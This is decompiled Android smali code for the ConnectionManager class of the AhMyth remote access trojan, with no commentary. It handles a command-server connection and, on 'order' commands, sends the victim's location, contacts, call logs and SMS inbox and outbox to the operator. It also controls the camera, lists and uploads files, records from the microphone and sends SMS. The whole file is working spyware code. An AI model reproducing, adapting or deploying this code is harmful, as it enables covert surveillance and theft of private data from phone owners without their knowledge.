.class public Lahmyth/mine/king/ahmyth/ConnectionManager;
.super Ljava/lang/Object;
.source "SourceFile"


# static fields
.field public static a:Landroid/content/Context;

.field private static b:Lk/e;

.field private static c:La/f;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    new-instance v0, La/f;

    invoke-direct {v0}, La/f;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->c:La/f;

    return-void
.end method

.method static synthetic a()Lk/e;
    .locals 1

    .line 1
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    .line 2
    .line 3
    return-object v0
.end method

.method private static b()V
    .locals 3

    .line 1
    :try_start_0
    const-string v0, "android.app.ActivityThread"

    invoke-static {v0}, Ljava/lang/Class;->forName(Ljava/lang/String;)Ljava/lang/Class;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/ClassNotFoundException; {:try_start_0 .. :try_end_0} :catch_0

    const-string v1, "currentApplication"

    const/4 v2, 0x0

    invoke-virtual {v0, v1, v2}, Ljava/lang/Class;->getMethod(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;

    move-result-object v0

    invoke-virtual {v0, v2, v2}, Ljava/lang/reflect/Method;->invoke(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Landroid/content/Context;

    if-nez v1, :cond_0

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$a;

    invoke-direct {v2, v0}, Lahmyth/mine/king/ahmyth/ConnectionManager$a;-><init>(Ljava/lang/reflect/Method;)V

    invoke-virtual {v1, v2}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    goto :goto_0

    :cond_0
    invoke-static {v1}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    :catch_0
    :goto_0
    return-void
.end method

.method public static getExternalStoragePath()V
    .locals 5

    invoke-static {}, La/f;->b()Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    :try_start_0
    const-string v2, "path"

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    const-string v2, "getExternalStoragePath"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v1, v3, v4

    invoke-virtual {v0, v2, v3}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static getSDCardPath()V
    .locals 5

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-static {v0}, La/f;->c(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    :try_start_0
    const-string v2, "path"

    invoke-virtual {v1, v2, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    const-string v2, "getSDCardPath"

    const/4 v3, 0x1

    new-array v3, v3, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v1, v3, v4

    invoke-virtual {v0, v2, v3}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static sendReq()V
    .locals 3

    :try_start_0
    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    if-eqz v0, :cond_0

    return-void

    :cond_0
    invoke-static {}, La/g;->a()La/g;

    move-result-object v0

    invoke-virtual {v0}, La/g;->b()Lk/e;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    const-string v1, "ping"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$b;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$b;-><init>()V

    invoke-virtual {v0, v1, v2}, Ll/a;->e(Ljava/lang/String;Ll/a$a;)Ll/a;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    const-string v1, "order"

    new-instance v2, Lahmyth/mine/king/ahmyth/ConnectionManager$c;

    invoke-direct {v2}, Lahmyth/mine/king/ahmyth/ConnectionManager$c;-><init>()V

    invoke-virtual {v0, v1, v2}, Ll/a;->e(Ljava/lang/String;Ll/a$a;)Ll/a;

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-virtual {v0}, Lk/e;->w()Lk/e;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v1, "error"

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method

.method public static startAsync(Landroid/content/Context;)V
    .locals 0

    :try_start_0
    sput-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->sendReq()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/ConnectionManager;->startAsync(Landroid/content/Context;)V

    :goto_0
    return-void
.end method

.method public static startContext()V
    .locals 0

    :try_start_0
    invoke-static {}, Lahmyth/mine/king/ahmyth/ConnectionManager;->b()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public static x0000ca(I)V
    .locals 4

    const/4 v0, 0x1

    const/4 v1, 0x0

    new-instance v2, La/b;

    sget-object v3, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-direct {v2, v3}, La/b;-><init>(Landroid/content/Context;)V

    const/4 v3, -0x1

    if-eq p0, v3, :cond_4

    if-eqz p0, :cond_3

    if-eq p0, v0, :cond_2

    const/4 v0, 0x2

    if-eq p0, v0, :cond_1

    const/4 v0, 0x3

    if-eq p0, v0, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "Unknown camera command: "

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p0

    const-string v0, "ConnectionManager"

    invoke-static {v0, p0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_0

    :cond_0
    invoke-virtual {v2}, La/b;->j()V

    goto :goto_0

    :cond_1
    invoke-virtual {v2, v1}, La/b;->h(I)V

    goto :goto_0

    :cond_2
    invoke-virtual {v2, v0}, La/b;->i(I)V

    goto :goto_0

    :cond_3
    invoke-virtual {v2, v1}, La/b;->i(I)V

    goto :goto_0

    :cond_4
    invoke-virtual {v2}, La/b;->d()Lorg/json/JSONObject;

    move-result-object p0

    if-eqz p0, :cond_5

    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    const-string v3, "x0000ca"

    new-array v0, v0, [Ljava/lang/Object;

    aput-object p0, v0, v1

    invoke-virtual {v2, v3, v0}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    :cond_5
    :goto_0
    return-void
.end method

.method public static x0000cl()V
    .locals 4

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-static {}, La/a;->a()Lorg/json/JSONObject;

    move-result-object v1

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v1, v2, v3

    const-string v1, "x0000cl"

    invoke-virtual {v0, v1, v2}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    return-void
.end method

.method public static x0000cn()V
    .locals 4

    sget-object v0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-static {}, La/d;->a()Lorg/json/JSONObject;

    move-result-object v1

    const/4 v2, 0x1

    new-array v2, v2, [Ljava/lang/Object;

    const/4 v3, 0x0

    aput-object v1, v2, v3

    const-string v1, "x0000cn"

    invoke-virtual {v0, v1, v2}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    return-void
.end method

.method public static x0000fm(ILjava/lang/String;)V
    .locals 2

    const/4 v0, 0x1

    if-nez p0, :cond_0

    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-static {p1}, La/f;->d(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object p1

    new-array v0, v0, [Ljava/lang/Object;

    const/4 v1, 0x0

    aput-object p1, v0, v1

    const-string p1, "x0000fm"

    invoke-virtual {p0, p1, v0}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    goto :goto_0

    :cond_0
    if-ne p0, v0, :cond_1

    invoke-static {p1}, La/f;->a(Ljava/lang/String;)V

    :cond_1
    :goto_0
    return-void
.end method

.method public static x0000lm()V
    .locals 10

    const/4 v0, 0x0

    const/4 v1, 0x1

    invoke-static {}, Landroid/os/Looper;->prepare()V

    new-instance v2, La/h;

    sget-object v3, Lahmyth/mine/king/ahmyth/ConnectionManager;->a:Landroid/content/Context;

    invoke-direct {v2, v3}, La/h;-><init>(Landroid/content/Context;)V

    new-instance v3, Lorg/json/JSONObject;

    invoke-direct {v3}, Lorg/json/JSONObject;-><init>()V

    invoke-virtual {v2}, La/h;->a()Z

    move-result v4

    const-string v5, "enable"

    if-eqz v4, :cond_0

    invoke-virtual {v2}, La/h;->b()D

    move-result-wide v6

    invoke-virtual {v2}, La/h;->d()D

    move-result-wide v8

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, v6, v7}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    const-string v4, "   ,  "

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v8, v9}, Ljava/lang/StringBuilder;->append(D)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const-string v4, "loc"

    invoke-static {v4, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    invoke-virtual {v3, v5, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v2, "lat"

    invoke-virtual {v3, v2, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    const-string v2, "lng"

    invoke-virtual {v3, v2, v8, v9}, Lorg/json/JSONObject;->put(Ljava/lang/String;D)Lorg/json/JSONObject;

    goto :goto_0

    :cond_0
    invoke-virtual {v3, v5, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    :goto_0
    sget-object v2, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    const-string v4, "x0000lm"

    new-array v1, v1, [Ljava/lang/Object;

    aput-object v3, v1, v0

    invoke-virtual {v2, v4, v1}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    return-void
.end method

.method public static x0000mc(I)V
    .locals 0

    invoke-static {p0}, La/l;->c(I)V

    return-void
.end method

.method public static x0000sm(ILjava/lang/String;Ljava/lang/String;)V
    .locals 3

    const/4 v0, 0x0

    const/4 v1, 0x1

    const-string v2, "x0000sm"

    if-nez p0, :cond_1

    const-string p0, "inbox"

    invoke-virtual {p0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-static {}, La/m;->a()Lorg/json/JSONObject;

    move-result-object p1

    new-array p2, v1, [Ljava/lang/Object;

    aput-object p1, p2, v0

    invoke-virtual {p0, v2, p2}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    goto :goto_0

    :cond_0
    const-string p0, "outbox"

    invoke-virtual {p0, p1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_2

    sget-object p0, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-static {}, La/m;->b()Lorg/json/JSONObject;

    move-result-object p1

    new-array p2, v1, [Ljava/lang/Object;

    aput-object p1, p2, v0

    invoke-virtual {p0, v2, p2}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    goto :goto_0

    :cond_1
    if-ne p0, v1, :cond_2

    invoke-static {p1, p2}, La/m;->c(Ljava/lang/String;Ljava/lang/String;)Z

    move-result p0

    sget-object p1, Lahmyth/mine/king/ahmyth/ConnectionManager;->b:Lk/e;

    invoke-static {p0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p0

    new-array p2, v1, [Ljava/lang/Object;

    aput-object p0, p2, v0

    invoke-virtual {p1, v2, p2}, Lk/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Ll/a;

    :cond_2
    :goto_0
    return-void
.end method
